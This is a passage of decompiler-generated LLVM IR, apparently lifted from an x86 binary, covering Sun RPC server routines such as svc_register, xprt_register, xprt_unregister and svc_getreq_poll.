  %v1_8063881 = icmp eq i32 %v3_806387a, 0
  br i1 %v1_8063881, label %entry.dec_label_pc_80638b9_crit_edge, label %dec_label_pc_8063885

entry.dec_label_pc_80638b9_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80638b9

dec_label_pc_8063885:                             ; preds = %entry
  %v3_8063885 = load i32, i32* %stack_var_-20, align 4
  %v1_8063889 = inttoptr i32 %v3_806387a to i32*
  %v2_8063889 = load i32, i32* %v1_8063889, align 4
  store i32 %v2_8063889, i32* @esi, align 4
  %v1_806388b = icmp eq i32 %v3_8063885, 0
  %v1_806388d = icmp eq i1 %v1_806388b, false
  br i1 %v1_806388d, label %dec_label_pc_806389c, label %dec_label_pc_806388f

dec_label_pc_806388f:                             ; preds = %dec_label_pc_8063885
  %v0_806388f = load i32, i32* %stack_var_-16, align 4
  %v1_806388f = call i32 @__rpc_thread_variables(i32 %v0_806388f)
  %v0_8063894 = load i32, i32* @esi, align 4
  %v2_8063894 = add i32 %v1_806388f, 184
  %v3_8063894 = inttoptr i32 %v2_8063894 to i32*
  store i32 %v0_8063894, i32* %v3_8063894, align 4
  br label %dec_label_pc_806389e

dec_label_pc_806389c:                             ; preds = %dec_label_pc_8063885
  %v2_806389c = inttoptr i32 %v3_8063885 to i32*
  store i32 %v2_8063889, i32* %v2_806389c, align 4
  br label %dec_label_pc_806389e

dec_label_pc_806389e:                             ; preds = %dec_label_pc_806388f, %dec_label_pc_806389c
  %v0_80638a1 = load i32, i32* @ebx, align 4
  %v1_80638a1 = inttoptr i32 %v0_80638a1 to i32*
  store i32 0, i32* %v1_80638a1, align 4
  %v0_80638a7 = load i32, i32* @ebx, align 4
  %v1_80638a8 = call i32 @free(i32 %v0_80638a7)
  %v0_80638af = load i32, i32* @edi, align 4
  %v1_80638b1 = call i32 @__GI_pmap_unset(i32 %v0_80638af)
  br label %dec_label_pc_80638b9

dec_label_pc_80638b9:                             ; preds = %entry.dec_label_pc_80638b9_crit_edge, %dec_label_pc_806389e
  %v0_80638c0 = phi i32 [ 0, %entry.dec_label_pc_80638b9_crit_edge ], [ %v1_80638b1, %dec_label_pc_806389e ]
  %v2_80638bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80638bc, i32* @ebx, align 4
  store i32 %v0_8063865, i32* @esi, align 4
  store i32 %v0_8063864, i32* @edi, align 4
  store i32 %v0_8063863, i32* @ebp, align 4
  ret i32 %v0_80638c0

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80638b9, { 1, 0 }
  uselistorder label %dec_label_pc_806389e, { 1, 0 }
}

define i32 @__rpc_thread_svc_cleanup() local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  br label %dec_label_pc_80638d6

dec_label_pc_80638c6:                             ; preds = %dec_label_pc_80638d6
  %v0_80638c6 = load i32, i32* @ecx, align 4
  %v1_80638c8 = add i32 %v3_80638db, 8
  %v2_80638c8 = inttoptr i32 %v1_80638c8 to i32*
  %v3_80638c8 = load i32, i32* %v2_80638c8, align 4
  %v1_80638cb = add i32 %v3_80638db, 4
  %v2_80638cb = inttoptr i32 %v1_80638cb to i32*
  %v3_80638cb = load i32, i32* %v2_80638cb, align 4
  %v4_80638ce = call i32 @svc_unregister(i32 %v3_80638cb, i32 %v3_80638c8, i32 %v0_80638c6, i32 %v0_80638c6)
  br label %dec_label_pc_80638d6

dec_label_pc_80638d6:                             ; preds = %entry, %dec_label_pc_80638c6
  %v0_80638d6 = phi i32 [ %v3_80638cb, %dec_label_pc_80638c6 ], [ %tmp7, %entry ]
  %v1_80638d6 = call i32 @__rpc_thread_variables(i32 %v0_80638d6)
  %v1_80638db = add i32 %v1_80638d6, 184
  %v2_80638db = inttoptr i32 %v1_80638db to i32*
  %v3_80638db = load i32, i32* %v2_80638db, align 4
  %v1_80638e1 = icmp eq i32 %v3_80638db, 0
  %v1_80638e3 = icmp eq i1 %v1_80638e1, false
  br i1 %v1_80638e3, label %dec_label_pc_80638c6, label %dec_label_pc_80638e5

dec_label_pc_80638e5:                             ; preds = %dec_label_pc_80638d6
  ret i32 %v3_80638db

; uselistorder directives
  uselistorder i32 %v3_80638db, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80638d6, { 1, 0 }
}

define i32 @__GI_svc_register(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_80638ea = load i32, i32* @edi, align 4
  %v0_80638eb = load i32, i32* @esi, align 4
  %v0_80638ec = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v2_80638f8 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80638f8, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  store i32 %arg2, i32* @eax, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v3_8063904 = call i32 @svc_find(i32 %v0_80638ec, i32 %v0_80638eb, i32 %v0_80638ea)
  store i32 %v3_8063904, i32* %eax.global-to-local, align 4
  %v1_8063909 = icmp eq i32 %v3_8063904, 0
  br i1 %v1_8063909, label %dec_label_pc_8063914, label %dec_label_pc_806390d

dec_label_pc_806390d:                             ; preds = %entry
  %v1_806390d = add i32 %v3_8063904, 12
  %v2_806390d = inttoptr i32 %v1_806390d to i32*
  %v3_806390d = load i32, i32* %v2_806390d, align 4
  %v4_806390d = load i32, i32* @ebp, align 4
  %v15_806390d = icmp eq i32 %v3_806390d, %v4_806390d
  %v1_8063910 = icmp eq i1 %v15_806390d, false
  br i1 %v1_8063910, label %dec_label_pc_8063968, label %dec_label_pc_8063943

dec_label_pc_8063914:                             ; preds = %entry
  store i32 16, i32* %stack_var_-60, align 4
  %v1_8063919 = call i32 @malloc(i32 16)
  store i32 %v1_8063919, i32* %eax.global-to-local, align 4
  store i32 %v1_8063919, i32* @ebx, align 4
  %v1_8063923 = icmp eq i32 %v1_8063919, 0
  br i1 %v1_8063923, label %dec_label_pc_8063968, label %dec_label_pc_8063927

dec_label_pc_8063927:                             ; preds = %dec_label_pc_8063914
  %v0_8063927 = load i32, i32* @edi, align 4
  %v2_8063927 = add i32 %v1_8063919, 4
  %v3_8063927 = inttoptr i32 %v2_8063927 to i32*
  store i32 %v0_8063927, i32* %v3_8063927, align 4
  %v0_806392a = load i32, i32* @esi, align 4
  %v1_806392a = load i32, i32* %eax.global-to-local, align 4
  %v2_806392a = add i32 %v1_806392a, 8
  %v3_806392a = inttoptr i32 %v2_806392a to i32*
  store i32 %v0_806392a, i32* %v3_806392a, align 4
  %v0_806392d = load i32, i32* @ebp, align 4
  %v1_806392d = load i32, i32* %eax.global-to-local, align 4
  %v2_806392d = add i32 %v1_806392d, 12
  %v3_806392d = inttoptr i32 %v2_806392d to i32*
  store i32 %v0_806392d, i32* %v3_806392d, align 4
  %v0_8063930 = load i32, i32* %stack_var_-60, align 4
  %v1_8063930 = call i32 @__rpc_thread_variables(i32 %v0_8063930)
  store i32 %v1_8063930, i32* %eax.global-to-local, align 4
  %v1_8063935 = add i32 %v1_8063930, 184
  %v2_8063935 = inttoptr i32 %v1_8063935 to i32*
  %v3_8063935 = load i32, i32* %v2_8063935, align 4
  %v1_806393b = load i32, i32* @ebx, align 4
  %v2_806393b = inttoptr i32 %v1_806393b to i32*
  store i32 %v3_8063935, i32* %v2_806393b, align 4
  %v0_806393d = load i32, i32* @ebx, align 4
  store i32 %v0_806393d, i32* %v2_8063935, align 4
  br label %dec_label_pc_8063943

dec_label_pc_8063943:                             ; preds = %dec_label_pc_806390d, %dec_label_pc_8063927
  store i32 1, i32* %eax.global-to-local, align 4
  %v4_8063948 = icmp eq i32 %arg5, 0
  br i1 %v4_8063948, label %dec_label_pc_806396a, label %dec_label_pc_806394f

dec_label_pc_806394f:                             ; preds = %dec_label_pc_8063943
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_8063953 = add i32 %arg1, 4
  %v2_8063953 = inttoptr i32 %v1_8063953 to i16*
  %v3_8063953 = load i16, i16* %v2_8063953, align 2
  %v4_8063953 = zext i16 %v3_8063953 to i32
  store i32 %v4_8063953, i32* %eax.global-to-local, align 4
  %v0_806395c = load i32, i32* @esi, align 4
  %v0_806395d = load i32, i32* @edi, align 4
  store i32 %v0_806395d, i32* %stack_var_-60, align 4
  %v4_806395e = call i32 @pmap_set(i32 %v0_806395d, i32 %v0_806395c, i32 %arg5, i32 %v4_8063953)
  store i32 %v4_806395e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806396a

dec_label_pc_8063968:                             ; preds = %dec_label_pc_8063914, %dec_label_pc_806390d
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806396a

dec_label_pc_806396a:                             ; preds = %dec_label_pc_8063943, %dec_label_pc_806394f, %dec_label_pc_8063968
  %v0_8063971 = phi i32 [ 1, %dec_label_pc_8063943 ], [ %v4_806395e, %dec_label_pc_806394f ], [ 0, %dec_label_pc_8063968 ]
  ret i32 %v0_8063971

; uselistorder directives
  uselistorder i32 %v1_8063919, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @svc_find, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_806396a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8063943, { 1, 0 }
}

define i32 @xprt_unregister(i32* %arg1) local_unnamed_addr {
entry:
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_8063972 = load i32, i32* @esi, align 4
  %v0_8063973 = load i32, i32* @ebx, align 4
  store i32 %v0_8063973, i32* %stack_var_-8, align 4
  store i32 %tmp4, i32* @esi, align 4
  %v2_806397b = load i32, i32* %arg1, align 4
  store i32 %v2_806397b, i32* @ebx, align 4
  %v2_806397d = call i32 @_rpc_dtablesize(i32 %v0_8063973, i32 %v0_8063972)
  %v0_8063982 = load i32, i32* @ebx, align 4
  %v5_8063984 = icmp slt i32 %v0_8063982, %v2_806397d
  br i1 %v5_8063984, label %dec_label_pc_8063986, label %dec_label_pc_80639e5

dec_label_pc_8063986:                             ; preds = %entry
  %v0_8063986 = load i32, i32* %stack_var_-8, align 4
  %v1_8063986 = call i32 @__rpc_thread_variables(i32 %v0_8063986)
  %v0_806398b = load i32, i32* @ebx, align 4
  %v1_806398b = mul i32 %v0_806398b, 4
  %v1_8063992 = add i32 %v1_8063986, 180
  %v2_8063992 = inttoptr i32 %v1_8063992 to i32*
  %v3_8063992 = load i32, i32* %v2_8063992, align 4
  %v2_8063998 = add i32 %v3_8063992, %v1_806398b
  %v3_8063998 = inttoptr i32 %v2_8063998 to i32*
  %v4_8063998 = load i32, i32* %v3_8063998, align 4
  %v5_8063998 = load i32, i32* @esi, align 4
  %v16_8063998 = icmp eq i32 %v4_8063998, %v5_8063998
  %v1_806399b = icmp eq i1 %v16_8063998, false
  br i1 %v1_806399b, label %dec_label_pc_80639e5, label %dec_label_pc_806399d

dec_label_pc_806399d:                             ; preds = %dec_label_pc_8063986
  store i32 0, i32* %v3_8063998, align 4
  %v0_80639a4 = load i32, i32* @ebx, align 4
  %v1_80639a4 = add i32 %v0_80639a4, -1023
  %v6_80639a4 = sub i32 1022, %v0_80639a4
  %v7_80639a4 = and i32 %v6_80639a4, %v0_80639a4
  %v8_80639a4 = icmp slt i32 %v7_80639a4, 0
  %v9_80639a4 = icmp eq i32 %v1_80639a4, 0
  %v10_80639a4 = icmp slt i32 %v1_80639a4, 0
  %v3_80639aa = icmp eq i1 %v10_80639a4, %v8_80639a4
  %v4_80639aa = icmp eq i1 %v9_80639a4, false
  %v5_80639aa = and i1 %v4_80639aa, %v3_80639aa
  br i1 %v5_80639aa, label %dec_label_pc_80639bf, label %dec_label_pc_80639ac

dec_label_pc_80639ac:                             ; preds = %dec_label_pc_806399d
  %v0_80639ac = call i32 @__GI___rpc_thread_svc_fdset()
  %v0_80639b1 = load i32, i32* @ebx, align 4
  %v2_80639b3 = udiv i32 %v0_80639b1, 32
  store i32 %v2_80639b3, i32* @ecx, align 4
  %v1_80639b8 = urem i32 %v0_80639b1, 32
  %v2_80639bb = mul nuw nsw i32 %v2_80639b3, 4
  %v3_80639bb = add i32 %v2_80639bb, %v0_80639ac
  %v4_80639bb = inttoptr i32 %v3_80639bb to i32*
  %v5_80639bb = load i32, i32* %v4_80639bb, align 4
  %v8_80639bb = shl i32 1, %v1_80639b8
  %v11_80639bb = sub i32 -1, %v8_80639bb
  %v12_80639bb = and i32 %v5_80639bb, %v11_80639bb
  store i32 %v12_80639bb, i32* %v4_80639bb, align 4
  br label %dec_label_pc_80639bf

dec_label_pc_80639bf:                             ; preds = %dec_label_pc_806399d, %dec_label_pc_80639ac
  br label %dec_label_pc_80639dc

dec_label_pc_80639c3:                             ; preds = %dec_label_pc_80639dc
  %v0_80639c3 = call i32 @__rpc_thread_svc_pollfd()
  %v0_80639c8 = load i32, i32* @esi, align 4
  %v1_80639c8 = mul i32 %v0_80639c8, 8
  %v2_80639cf = inttoptr i32 %v0_80639c3 to i32*
  %v3_80639cf = load i32, i32* %v2_80639cf, align 4
  %v4_80639cf = add i32 %v3_80639cf, %v1_80639c8
  %v1_80639d1 = inttoptr i32 %v4_80639cf to i32*
  %v2_80639d1 = load i32, i32* %v1_80639d1, align 4
  %v3_80639d1 = load i32, i32* @ebx, align 4
  %v14_80639d1 = icmp eq i32 %v2_80639d1, %v3_80639d1
  %v1_80639d3 = icmp eq i1 %v14_80639d1, false
  br i1 %v1_80639d3, label %dec_label_pc_80639db, label %dec_label_pc_80639d5

dec_label_pc_80639d5:                             ; preds = %dec_label_pc_80639c3
  store i32 -1, i32* %v1_80639d1, align 4
  %v0_80639db.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80639db

dec_label_pc_80639db:                             ; preds = %dec_label_pc_80639c3, %dec_label_pc_80639d5
  %v0_80639db = phi i32 [ %v0_80639c8, %dec_label_pc_80639c3 ], [ %v0_80639db.pre, %dec_label_pc_80639d5 ]
  %v1_80639db = add i32 %v0_80639db, 1
  br label %dec_label_pc_80639dc

dec_label_pc_80639dc:                             ; preds = %dec_label_pc_80639bf, %dec_label_pc_80639db
  %storemerge = phi i32 [ 0, %dec_label_pc_80639bf ], [ %v1_80639db, %dec_label_pc_80639db ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_80639dc = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_80639e1 = load i32, i32* @esi, align 4
  %v2_80639e1 = inttoptr i32 %v0_80639dc to i32*
  %v3_80639e1 = load i32, i32* %v2_80639e1, align 4
  %v5_80639e3 = icmp slt i32 %v0_80639e1, %v3_80639e1
  br i1 %v5_80639e3, label %dec_label_pc_80639c3, label %dec_label_pc_80639e5

dec_label_pc_80639e5:                             ; preds = %dec_label_pc_80639dc, %entry, %dec_label_pc_8063986
  %v0_80639e8 = phi i32 [ %v2_806397d, %entry ], [ %v3_8063992, %dec_label_pc_8063986 ], [ %v0_80639dc, %dec_label_pc_80639dc ]
  %v2_80639e6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80639e6, i32* @ebx, align 4
  store i32 %v0_8063972, i32* @esi, align 4
  ret i32 %v0_80639e8

; uselistorder directives
  uselistorder i32 %v2_80639b3, { 1, 0 }
  uselistorder i32 %v0_80639b1, { 1, 0 }
  uselistorder i32 %v1_80639a4, { 1, 0 }
  uselistorder i32 %v3_8063992, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80639e5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80639dc, { 1, 0 }
  uselistorder label %dec_label_pc_80639db, { 1, 0 }
  uselistorder label %dec_label_pc_80639bf, { 1, 0 }
}

define i32 @svc_getreq_poll(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80639ec = load i32, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v0_8063a3b11 = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_8063a4012 = load i32, i32* @esi, align 4
  %v2_8063a4013 = inttoptr i32 %v0_8063a3b11 to i32*
  %v3_8063a4014 = load i32, i32* %v2_8063a4013, align 4
  %v5_8063a4222 = icmp slt i32 %v0_8063a4012, %v3_8063a4014
  br i1 %v5_8063a4222, label %dec_label_pc_8063a44, label %dec_label_pc_8063a48

dec_label_pc_80639fa:                             ; preds = %dec_label_pc_8063a44
  %v2_80639fe = mul i32 %v0_8063a4024, 8
  %v3_80639fe = add i32 %v2_80639fe, %arg1
  %v1_8063a01 = inttoptr i32 %v3_80639fe to i32*
  %v2_8063a01 = load i32, i32* %v1_8063a01, align 4
  store i32 %v2_8063a01, i32* @ebx, align 4
  %v10_8063a03 = icmp eq i32 %v2_8063a01, -1
  br i1 %v10_8063a03, label %dec_label_pc_8063a3a, label %dec_label_pc_8063a08

dec_label_pc_8063a08:                             ; preds = %dec_label_pc_80639fa
  %v1_8063a08 = add i32 %v3_80639fe, 6
  %v2_8063a08 = inttoptr i32 %v1_8063a08 to i16*
  %v3_8063a08 = load i16, i16* %v2_8063a08, align 2
  %v4_8063a0c = icmp eq i16 %v3_8063a08, 0
  br i1 %v4_8063a0c, label %dec_label_pc_8063a3a, label %dec_label_pc_8063a11

dec_label_pc_8063a11:                             ; preds = %dec_label_pc_8063a08
  %v1_8063a11 = add i32 %v0_8063a44, 1
  store i32 %v1_8063a11, i32* @edi, align 4
  %v2_8063a12 = and i16 %v3_8063a08, 32
  %v3_8063a12 = icmp eq i16 %v2_8063a12, 0
  br i1 %v3_8063a12, label %dec_label_pc_8063a2e, label %dec_label_pc_8063a16

dec_label_pc_8063a16:                             ; preds = %dec_label_pc_8063a11
  %v1_8063a16 = call i32 @__rpc_thread_variables(i32 %v0_80639ec)
  %v1_8063a1e = add i32 %v1_8063a16, 180
  %v2_8063a1e = inttoptr i32 %v1_8063a1e to i32*
  %v3_8063a1e = load i32, i32* %v2_8063a1e, align 4
  %v1_8063a24 = load i32, i32* @ebx, align 4
  %v2_8063a24 = mul i32 %v1_8063a24, 4
  %v3_8063a24 = add i32 %v2_8063a24, %v3_8063a1e
  %v4_8063a24 = inttoptr i32 %v3_8063a24 to i32*
  %v5_8063a24 = load i32, i32* %v4_8063a24, align 4
  %v1_8063a27 = inttoptr i32 %v5_8063a24 to i32*
  %v2_8063a27 = call i32 @xprt_unregister(i32* %v1_8063a27)
  br label %dec_label_pc_8063a37

dec_label_pc_8063a2e:                             ; preds = %dec_label_pc_8063a11
  %v1_8063a32 = call i32 @svc_getreq_common(i32 %v2_8063a01)
  br label %dec_label_pc_8063a37

dec_label_pc_8063a37:                             ; preds = %dec_label_pc_8063a16, %dec_label_pc_8063a2e
  %v0_8063a3a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8063a3a

dec_label_pc_8063a3a:                             ; preds = %dec_label_pc_8063a08, %dec_label_pc_80639fa, %dec_label_pc_8063a37
  %v0_8063a3a = phi i32 [ %v0_8063a4024, %dec_label_pc_8063a08 ], [ %v0_8063a4024, %dec_label_pc_80639fa ], [ %v0_8063a3a.pre, %dec_label_pc_8063a37 ]
  %v1_8063a3a = add i32 %v0_8063a3a, 1
  store i32 %v1_8063a3a, i32* @esi, align 4
  %v0_8063a3b = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_8063a40 = load i32, i32* @esi, align 4
  %v2_8063a40 = inttoptr i32 %v0_8063a3b to i32*
  %v3_8063a40 = load i32, i32* %v2_8063a40, align 4
  %v5_8063a42 = icmp slt i32 %v0_8063a40, %v3_8063a40
  br i1 %v5_8063a42, label %dec_label_pc_8063a44, label %dec_label_pc_8063a48

dec_label_pc_8063a44:                             ; preds = %entry, %dec_label_pc_8063a3a
  %v0_8063a4024 = phi i32 [ %v0_8063a40, %dec_label_pc_8063a3a ], [ %v0_8063a4012, %entry ]
  %v0_8063a3b23 = phi i32 [ %v0_8063a3b, %dec_label_pc_8063a3a ], [ %v0_8063a3b11, %entry ]
  %v0_8063a44 = load i32, i32* @edi, align 4
  %v1_8063a44 = load i32, i32* @ebp, align 4
  %v5_8063a46 = icmp slt i32 %v0_8063a44, %v1_8063a44
  br i1 %v5_8063a46, label %dec_label_pc_80639fa, label %dec_label_pc_8063a48

dec_label_pc_8063a48:                             ; preds = %dec_label_pc_8063a44, %dec_label_pc_8063a3a, %entry
  %v0_8063a3b.lcssa = phi i32 [ %v0_8063a3b11, %entry ], [ %v0_8063a3b, %dec_label_pc_8063a3a ], [ %v0_8063a3b23, %dec_label_pc_8063a44 ]
  ret i32 %v0_8063a3b.lcssa

; uselistorder directives
  uselistorder i32 %v0_8063a44, { 1, 0 }
  uselistorder i32 %v2_8063a01, { 1, 0, 2 }
  uselistorder i32 (i32)* @svc_getreq_common, { 1, 0 }
  uselistorder i16 32, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8063a44, { 1, 0 }
  uselistorder label %dec_label_pc_8063a3a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8063a37, { 1, 0 }
}

define i32 @xprt_register(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-28, align 4
  %stack_var_-24 = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp9, i32* %stack_var_-24, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8063a51 = load i32, i32* @esi, align 4
  %v0_8063a52 = load i32, i32* @ebx, align 4
  store i32 %v0_8063a52, i32* %stack_var_-12, align 4
  %v1_8063a53 = call i32 @__rpc_thread_variables(i32 %v0_8063a52)
  store i32 %v1_8063a53, i32* %eax.global-to-local, align 4
  store i32 %tmp4, i32* @esi, align 4
  store i32 %v1_8063a53, i32* @ebx, align 4
  %v1_8063a5e = add i32 %v1_8063a53, 180
  %v2_8063a5e = inttoptr i32 %v1_8063a5e to i32*
  %v3_8063a5e = load i32, i32* %v2_8063a5e, align 4
  %v4_8063a5e = icmp eq i32 %v3_8063a5e, 0
  %v2_8063a65 = load i32, i32* %arg1, align 4
  store i32 %v2_8063a65, i32* @edi, align 4
  %v1_8063a67 = icmp eq i1 %v4_8063a5e, false
  br i1 %v1_8063a67, label %dec_label_pc_8063a8b, label %dec_label_pc_8063a69

dec_label_pc_8063a69:                             ; preds = %entry
  %v0_8063a69 = load i32, i32* %stack_var_-12, align 4
  %v2_8063a69 = call i32 @_rpc_dtablesize(i32 %v0_8063a69, i32 %v0_8063a51)
  %v2_8063a71 = mul i32 %v2_8063a69, 4
  store i32 %v2_8063a71, i32* %eax.global-to-local, align 4
  store i32 %v2_8063a71, i32* %stack_var_-28, align 4
  %v1_8063a75 = call i32 @malloc(i32 %v2_8063a71)
  store i32 %v1_8063a75, i32* %eax.global-to-local, align 4
  %v1_8063a7d = load i32, i32* @ebx, align 4
  %v2_8063a7d = add i32 %v1_8063a7d, 180
  %v3_8063a7d = inttoptr i32 %v2_8063a7d to i32*
  store i32 %v1_8063a75, i32* %v3_8063a7d, align 4
  %v0_8063a83 = load i32, i32* %eax.global-to-local, align 4
  %v1_8063a83 = icmp eq i32 %v0_8063a83, 0
  br i1 %v1_8063a83, label %dec_label_pc_8063b25, label %dec_label_pc_8063a69.dec_label_pc_8063a8b_crit_edge

dec_label_pc_8063a69.dec_label_pc_8063a8b_crit_edge: ; preds = %dec_label_pc_8063a69
  %v0_8063a8b.pre = load i32, i32* %stack_var_-28, align 4
  %v1_8063a8b.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_8063a8b

dec_label_pc_8063a8b:                             ; preds = %dec_label_pc_8063a69.dec_label_pc_8063a8b_crit_edge, %entry
  %v1_8063a8b = phi i32 [ %v1_8063a8b.pre, %dec_label_pc_8063a69.dec_label_pc_8063a8b_crit_edge ], [ %tmp9, %entry ]
  %v0_8063a8b = phi i32 [ %v0_8063a8b.pre, %dec_label_pc_8063a69.dec_label_pc_8063a8b_crit_edge ], [ %tmp8, %entry ]
  %v2_8063a8b = call i32 @_rpc_dtablesize(i32 %v0_8063a8b, i32 %v1_8063a8b)
  store i32 %v2_8063a8b, i32* %eax.global-to-local, align 4
  %v0_8063a90 = load i32, i32* @edi, align 4
  %v5_8063a92 = icmp slt i32 %v0_8063a90, %v2_8063a8b
  br i1 %v5_8063a92, label %dec_label_pc_8063a98, label %dec_label_pc_8063b25

dec_label_pc_8063a98:                             ; preds = %dec_label_pc_8063a8b
  %v0_8063a98 = load i32, i32* @ebx, align 4
  %v1_8063a98 = add i32 %v0_8063a98, 180
  %v2_8063a98 = inttoptr i32 %v1_8063a98 to i32*
  %v3_8063a98 = load i32, i32* %v2_8063a98, align 4
  store i32 %v3_8063a98, i32* %eax.global-to-local, align 4
  %v1_8063a9e = add i32 %v0_8063a90, -1023
  %v6_8063a9e = sub i32 1022, %v0_8063a90
  %v7_8063a9e = and i32 %v6_8063a9e, %v0_8063a90
  %v8_8063a9e = icmp slt i32 %v7_8063a9e, 0
  %v9_8063a9e = icmp eq i32 %v1_8063a9e, 0
  %v10_8063a9e = icmp slt i32 %v1_8063a9e, 0
  %v0_8063aa4 = load i32, i32* @esi, align 4
  %v3_8063aa4 = mul i32 %v0_8063a90, 4
  %v4_8063aa4 = add i32 %v3_8063a98, %v3_8063aa4
  %v5_8063aa4 = inttoptr i32 %v4_8063aa4 to i32*
  store i32 %v0_8063aa4, i32* %v5_8063aa4, align 4
  %v3_8063aa7 = icmp eq i1 %v10_8063a9e, %v8_8063a9e
  %v4_8063aa7 = icmp eq i1 %v9_8063a9e, false
  %v5_8063aa7 = and i1 %v4_8063aa7, %v3_8063aa7
  br i1 %v5_8063aa7, label %dec_label_pc_8063abc, label %dec_label_pc_8063aa9

dec_label_pc_8063aa9:                             ; preds = %dec_label_pc_8063a98
  %v0_8063aa9 = call i32 @__GI___rpc_thread_svc_fdset()
  store i32 %v0_8063aa9, i32* %eax.global-to-local, align 4
  %v0_8063aae = load i32, i32* @edi, align 4
  %v2_8063ab0 = udiv i32 %v0_8063aae, 32
  store i32 %v2_8063ab0, i32* @ecx, align 4
  %v1_8063ab5 = urem i32 %v0_8063aae, 32
  %v2_8063ab8 = mul nuw nsw i32 %v2_8063ab0, 4
  %v3_8063ab8 = add i32 %v2_8063ab8, %v0_8063aa9
  %v4_8063ab8 = inttoptr i32 %v3_8063ab8 to i32*
  %v5_8063ab8 = load i32, i32* %v4_8063ab8, align 4
  %v8_8063ab8 = shl i32 1, %v1_8063ab5
  %v11_8063ab8 = or i32 %v5_8063ab8, %v8_8063ab8
  store i32 %v11_8063ab8, i32* %v4_8063ab8, align 4
  br label %dec_label_pc_8063abc

dec_label_pc_8063abc:                             ; preds = %dec_label_pc_8063a98, %dec_label_pc_8063aa9
  br label %dec_label_pc_8063ae3

dec_label_pc_8063ac0:                             ; preds = %dec_label_pc_8063ae3
  %v0_8063ac0 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_8063ac0, i32* %eax.global-to-local, align 4
  %v0_8063ac5 = load i32, i32* @ebx, align 4
  %v1_8063ac5 = mul i32 %v0_8063ac5, 8
  store i32 %v1_8063ac5, i32* @ecx, align 4
  %v2_8063ace = inttoptr i32 %v0_8063ac0 to i32*
  %v3_8063ace = load i32, i32* %v2_8063ace, align 4
  %v4_8063ace = add i32 %v3_8063ace, %v1_8063ac5
  %v1_8063ad0 = inttoptr i32 %v4_8063ace to i32*
  %v2_8063ad0 = load i32, i32* %v1_8063ad0, align 4
  %v12_8063ad0 = icmp eq i32 %v2_8063ad0, -1
  %v1_8063ad3 = icmp eq i1 %v12_8063ad0, false
  br i1 %v1_8063ad3, label %dec_label_pc_8063ae2, label %dec_label_pc_8063ad5

dec_label_pc_8063ad5:                             ; preds = %dec_label_pc_8063ac0
  %v0_8063ad5 = load i32, i32* @edi, align 4
  store i32 %v0_8063ad5, i32* %v1_8063ad0, align 4
  %v2_8063ad7 = load i32, i32* %v2_8063ace, align 4
  store i32 %v2_8063ad7, i32* %eax.global-to-local, align 4
  %v1_8063ad9 = load i32, i32* @ecx, align 4
  %v2_8063ad9 = add i32 %v2_8063ad7, 4
  %v3_8063ad9 = add i32 %v2_8063ad9, %v1_8063ad9
  %v4_8063ad9 = inttoptr i32 %v3_8063ad9 to i16*
  store i16 195, i16* %v4_8063ad9, align 2
  br label %dec_label_pc_8063b25

dec_label_pc_8063ae2:                             ; preds = %dec_label_pc_8063ac0
  %v1_8063ae2 = add i32 %v0_8063ac5, 1
  br label %dec_label_pc_8063ae3

dec_label_pc_8063ae3:                             ; preds = %dec_label_pc_8063abc, %dec_label_pc_8063ae2
  %storemerge = phi i32 [ 0, %dec_label_pc_8063abc ], [ %v1_8063ae2, %dec_label_pc_8063ae2 ]
  store i32 %storemerge, i32* @ebx, align 4
  %v0_8063ae3 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_8063ae3, i32* %eax.global-to-local, align 4
  store i32 %v0_8063ae3, i32* @esi, align 4
  %v1_8063aea = inttoptr i32 %v0_8063ae3 to i32*
